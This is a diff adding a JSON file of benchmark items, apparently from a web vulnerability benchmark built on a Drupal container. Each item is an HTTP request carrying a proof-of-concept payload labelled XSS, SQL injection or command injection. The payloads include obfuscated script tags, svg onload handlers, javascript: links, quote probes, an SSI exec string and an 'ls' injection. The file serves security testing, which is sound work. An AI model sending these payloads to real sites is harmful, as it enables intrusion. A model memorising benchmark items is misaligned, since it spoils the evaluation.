@@ -1,0 +1,678 @@
+[
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "POST",
+    "path": "/",
+    "post_data": {
+      "WHERE ( (sid ": [
+        ":db_condition_placeholder_0) AND (ssid = :db_condition_placeholder_1) )"
+      ]
+    },
+    "query_params": {
+      "q": [
+        "ls '"
+      ]
+    },
+    "request_id": "requests.68245dce3b878",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_038ad8",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "POST",
+    "path": "/admin/compact/on",
+    "post_data": {
+      "WHERE ( (sid ": [
+        ":db_condition_placeholder_0) AND (ssid = :db_condition_placeholder_1) )"
+      ]
+    },
+    "query_params": {
+      "destination": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ]
+    },
+    "request_id": "requests.67f56b83a4317",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_0b4d4a",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "GET",
+    "path": "/",
+    "post_data": {},
+    "query_params": {
+      "q": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ]
+    },
+    "request_id": "requests.6819cb7b3b919",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_10792d",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "POST",
+    "path": "/search/user",
+    "post_data": {
+      "form_build_id": [
+        "form-DNyCpJrVFBh4Z72PyCFyTWe8RrthlspEFzbLEQyHrs8"
+      ],
+      "form_id": [
+        "search_form"
+      ],
+      "form_token": [
+        "JLkLjpu5iySe9WgEN6yrm6tSSdHqkJg0wTQRGRxr8mY"
+      ],
+      "keys": [
+        "\""
+      ],
+      "op": [
+        "Search"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67f56b7f11194",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_1b39b8",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "POST",
+    "path": "/admin/compact/on",
+    "post_data": {
+      "WHERE ( (sid ": [
+        ":db_condition_placeholder_0) AND (ssid = :db_condition_placeholder_1) )"
+      ]
+    },
+    "query_params": {
+      "destination": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ]
+    },
+    "request_id": "requests.67f56b83a4317",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_23508e",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "GET",
+    "path": "/",
+    "post_data": {},
+    "query_params": {
+      "q": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ]
+    },
+    "request_id": "requests.6819cb7b3b919",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_35a55e",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "GET",
+    "path": "/",
+    "post_data": {},
+    "query_params": {
+      "q": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.6819cb7b3b919",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_3b08be",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "POST",
+    "path": "/search",
+    "post_data": {
+      "form_build_id": [
+        "form-zMwTbufa4QRz7BqpLfK34upYZFgu0biR5AFR14tFnGU"
+      ],
+      "form_id": [
+        "user_login_block"
+      ],
+      "name": [
+        "ZAP"
+      ],
+      "op": [
+        "Log in"
+      ],
+      "pass": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ]
+    },
+    "query_params": {
+      "destination": [
+        "search"
+      ]
+    },
+    "request_id": "requests.68245dc94ae88",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_4ad69d",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "POST",
+    "path": "/search/user",
+    "post_data": {
+      "form_build_id": [
+        "form-DNyCpJrVFBh4Z72PyCFyTWe8RrthlspEFzbLEQyHrs8"
+      ],
+      "form_id": [
+        "search_form"
+      ],
+      "form_token": [
+        "JLkLjpu5iySe9WgEN6yrm6tSSdHqkJg0wTQRGRxr8mY"
+      ],
+      "keys": [
+        "%22%3E%3Ca%20href%3Djavascrip%26%23116%3B%3Aalert%28987890%29%3B%3E1%3C/a%3E"
+      ],
+      "op": [
+        "Search"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67f56b7f11194",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_5fda21",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "GET",
+    "path": "/",
+    "post_data": {},
+    "query_params": {
+      "q": [
+        "\"><svg onload=alert(987890)//"
+      ]
+    },
+    "request_id": "requests.6819cb7b3b919",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_60e539",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "POST",
+    "path": "/search/user",
+    "post_data": {
+      "form_build_id": [
+        "form-DNyCpJrVFBh4Z72PyCFyTWe8RrthlspEFzbLEQyHrs8"
+      ],
+      "form_id": [
+        "search_form"
+      ],
+      "form_token": [
+        "JLkLjpu5iySe9WgEN6yrm6tSSdHqkJg0wTQRGRxr8mY"
+      ],
+      "keys": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "op": [
+        "Search"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67f56b7f11194",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_6498b1",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "POST",
+    "path": "/search",
+    "post_data": {
+      "form_build_id": [
+        "form-zMwTbufa4QRz7BqpLfK34upYZFgu0biR5AFR14tFnGU"
+      ],
+      "form_id": [
+        "user_login_block"
+      ],
+      "name": [
+        "sqli%2527"
+      ],
+      "op": [
+        "Log in"
+      ],
+      "pass": [
+        "<!--#EXEC cmd=\"dir \\\"-->"
+      ]
+    },
+    "query_params": {
+      "destination": [
+        "search"
+      ]
+    },
+    "request_id": "requests.68245d2f2ff6f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_656336",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "POST",
+    "path": "/search/user",
+    "post_data": {
+      "form_build_id": [
+        "form-DNyCpJrVFBh4Z72PyCFyTWe8RrthlspEFzbLEQyHrs8"
+      ],
+      "form_id": [
+        "search_form"
+      ],
+      "form_token": [
+        "JLkLjpu5iySe9WgEN6yrm6tSSdHqkJg0wTQRGRxr8mY"
+      ],
+      "keys": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ],
+      "op": [
+        "Search"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67f56b7f11194",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_6e0e2a",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "POST",
+    "path": "/admin/people/create",
+    "post_data": {
+      "form_build_id": [
+        "\""
+      ],
+      "form_id": [
+        "user_register_form"
+      ],
+      "form_token": [
+        "KEvyGYkwVXd-kIvdW8EVSY4RK0cry9DqPJLB4LV4JTw"
+      ],
+      "mail": [
+        "xuefeng20011024"
+      ],
+      "name": [
+        "xuefeng20011024"
+      ],
+      "notify": [
+        "1"
+      ],
+      "op": [
+        "Create new account"
+      ],
+      "pass": [
+        "Array"
+      ],
+      "roles": [
+        "Array"
+      ],
+      "status": [
+        "0"
+      ],
+      "timezone": [
+        "Asia/Shanghai"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67f56b8452b62",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_802d07",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "POST",
+    "path": "/",
+    "post_data": {
+      "WHERE ( (sid ": [
+        ":db_condition_placeholder_0) AND (ssid = :db_condition_placeholder_1) )"
+      ]
+    },
+    "query_params": {
+      "q": [
+        "\"><svg onload=alert(987890)//"
+      ]
+    },
+    "request_id": "requests.68245dce3b878",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_88b97f",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "POST",
+    "path": "/",
+    "post_data": {
+      "WHERE ( (sid ": [
+        ":db_condition_placeholder_0) AND (ssid = :db_condition_placeholder_1) )"
+      ]
+    },
+    "query_params": {
+      "q": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.68245dce3b878",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_96616e",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "GET",
+    "path": "/update.php",
+    "post_data": {},
+    "query_params": {
+      "op": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "token": [
+        "SosF0_WsnZOn7o0lTZMWIJU3S1bf5x2pO9W2WWqjExQ"
+      ]
+    },
+    "request_id": "requests.67f56b8043c3c",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_9b00d8",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "POST",
+    "path": "/user/1/edit",
+    "post_data": {
+      "WHERE ( (cid ": [
+        ":db_condition_placeholder_0) )"
+      ]
+    },
+    "query_params": {
+      "destination": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ]
+    },
+    "request_id": "requests.67f56b870b4dc",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_a119ee",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "GET",
+    "path": "/",
+    "post_data": {},
+    "query_params": {
+      "q": [
+        "'"
+      ]
+    },
+    "request_id": "requests.6819cb7b3b919",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_a5ac15",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "GET",
+    "path": "/update.php",
+    "post_data": {},
+    "query_params": {
+      "op": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "token": [
+        "SosF0_WsnZOn7o0lTZMWIJU3S1bf5x2pO9W2WWqjExQ"
+      ]
+    },
+    "request_id": "requests.67f56b8043c3c",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_d05347",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "POST",
+    "path": "/search/user",
+    "post_data": {
+      "form_build_id": [
+        "form-DNyCpJrVFBh4Z72PyCFyTWe8RrthlspEFzbLEQyHrs8"
+      ],
+      "form_id": [
+        "search_form"
+      ],
+      "form_token": [
+        "JLkLjpu5iySe9WgEN6yrm6tSSdHqkJg0wTQRGRxr8mY"
+      ],
+      "keys": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "op": [
+        "Search"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67f56b7f11194",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_daf24e",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "GET",
+    "path": "/",
+    "post_data": {},
+    "query_params": {
+      "q": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.6819cb7b3b919",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_ebb9de",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "GET",
+    "path": "/",
+    "post_data": {},
+    "query_params": {
+      "q": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ]
+    },
+    "request_id": "requests.6819cb7b3b919",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_f3c629",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "POST",
+    "path": "/admin/people/create",
+    "post_data": {
+      "form_build_id": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "form_id": [
+        "user_register_form"
+      ],
+      "form_token": [
+        "KEvyGYkwVXd-kIvdW8EVSY4RK0cry9DqPJLB4LV4JTw"
+      ],
+      "mail": [
+        "xuefeng20011024"
+      ],
+      "name": [
+        "xuefeng20011024"
+      ],
+      "notify": [
+        "1"
+      ],
+      "op": [
+        "Create new account"
+      ],
+      "pass": [
+        "Array"
+      ],
+      "roles": [
+        "Array"
+      ],
+      "status": [
+        "0"
+      ],
+      "timezone": [
+        "Asia/Shanghai"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67f56b8452b62",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_f747bb",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "GET",
+    "path": "/",
+    "post_data": {},
+    "query_params": {
+      "q": [
+        "'"
+      ]
+    },
+    "request_id": "requests.6819cb7b3b919",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_f7692c",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "drupal",
+    "application_name": "Drupal",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-drupal-v0.1.0",
+    "method": "GET",
+    "path": "/",
+    "post_data": {},
+    "query_params": {
+      "q": [
+        "\""
+      ]
+    },
+    "request_id": "requests.6819cb7b3b919",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/drupal/drupal",
+    "vuln_id": "vuln_function_fba7aa",
+    "vuln_type": "sqli"
+  }
+]
